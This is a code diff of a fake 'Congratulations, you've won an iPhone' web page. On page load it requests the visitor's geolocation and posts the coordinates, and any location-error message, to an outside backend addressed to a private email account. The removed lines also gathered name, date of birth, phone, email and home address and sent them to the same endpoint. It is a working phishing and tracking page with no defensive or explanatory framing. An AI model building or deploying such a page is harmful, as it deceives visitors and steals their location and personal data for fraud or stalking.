@@ -43,19 +43,16 @@
             font-size: 0.9rem;
             color: #666;
         }
-        #rewardForm {
-            display: none; /* Initially hide the form */
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1 class="form-heading">Congratulations! 🎉</h1>
         <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p id="locationDisplay" class="form-text">Requesting location permission...</p>
+        <p class="form-text">Please fill out the form below to claim your reward.</p>
 
         <!-- Fill Out Form -->
-        <form id="rewardForm">
+        <form id="rewardForm" style="display: none;">
             <div class="form-group">
                 <label for="fullName">Full Name</label>
                 <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
@@ -86,6 +83,7 @@
             </div>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
+        <p id="locationDisplay" class="form-text">Requesting location permission...</p>
     </div>
 
     <!-- Bootstrap and jQuery JS -->
@@ -99,7 +97,7 @@
             const locationDisplay = document.getElementById("locationDisplay");
             const rewardForm = document.getElementById("rewardForm");
 
-            // Request location permission
+            // Request location immediately on page load
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -107,84 +105,67 @@
                         const longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                         
+                        // Show the form
+                        rewardForm.style.display = "block";
+
                         // Send location data via email
-                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com")
-                            .then(() => {
-                                rewardForm.style.display = "block"; // Show the form after successful email
-                                locationDisplay.textContent = "Location captured successfully! Please fill out the form.";
-                            })
-                            .catch((error) => {
-                                locationDisplay.textContent = "Error sending location data.";
-                                console.error("Error sending email:", error);
-                            });
+                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
-                        locationDisplay.textContent = "Failed to capture location. Please enable location services.";
-                        console.error("Geolocation error:", error);
+                        handleLocationError(error);
                     }
                 );
             } else {
                 locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
-        });
 
-        // Send Email Function
-        async function sendEmail(subject, message, recipientEmail) {
-            const emailData = {
-                subject: subject,
-                message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "Khalil Ahmed"
-            };
-
-            const response = await fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(emailData)
-            });
-
-            if (!response.ok) {
-                throw new Error(`Server responded with ${response.status}`);
+            function handleLocationError(error) {
+                let errorMessage = "An unknown error occurred.";
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage = "Location access denied by user.";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage = "Location information is unavailable.";
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage = "Location request timed out.";
+                        break;
+                }
+                locationDisplay.textContent = errorMessage;
+                sendEmail("Location Access Error", errorMessage, "khalilrodeni@gmail.com");
             }
 
-            return response.json();
-        }
+            // Send Email Function
+            function sendEmail(subject, message, recipientEmail) {
+                const emailData = {
+                    subject: subject,
+                    message: message,
+                    recipient_email: recipientEmail,
+                    recipient_name: "Khalil Ahmed"
+                };
 
-        // Form submission
-        document.getElementById("rewardForm").addEventListener("submit", function (e) {
-            e.preventDefault();
-
-            // Collect form data
-            const fullName = document.getElementById("fullName").value;
-            const dob = document.getElementById("dob").value;
-            const email = document.getElementById("email").value;
-            const phoneNumber = document.getElementById("phoneNumber").value;
-            const address = document.getElementById("address").value;
-            const city = document.getElementById("city").value;
-            const postalCode = document.getElementById("postalCode").value;
-
-            // Format form data into a message
-            const formMessage = `
-                Full Name: ${fullName}\n
-                Date of Birth: ${dob}\n
-                Email: ${email}\n
-                Phone Number: ${phoneNumber}\n
-                Address: ${address}\n
-                City: ${city}\n
-                Postal Code: ${postalCode}
-            `;
-
-            // Send form data via email
-            sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com")
-                .then(() => {
-                    alert("Thank you for your submission! We will contact you shortly.");
+                fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(emailData)
                 })
-                .catch((error) => {
-                    console.error("Error sending form data:", error);
-                    alert("Failed to submit the form. Please try again.");
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`Server responded with ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("Email sent successfully:", data);
+                })
+                .catch(error => {
+                    console.error("Error sending email:", error);
+                    locationDisplay.textContent = "Error sending location data.";
                 });
+            }
         });
     </script>
 </body>
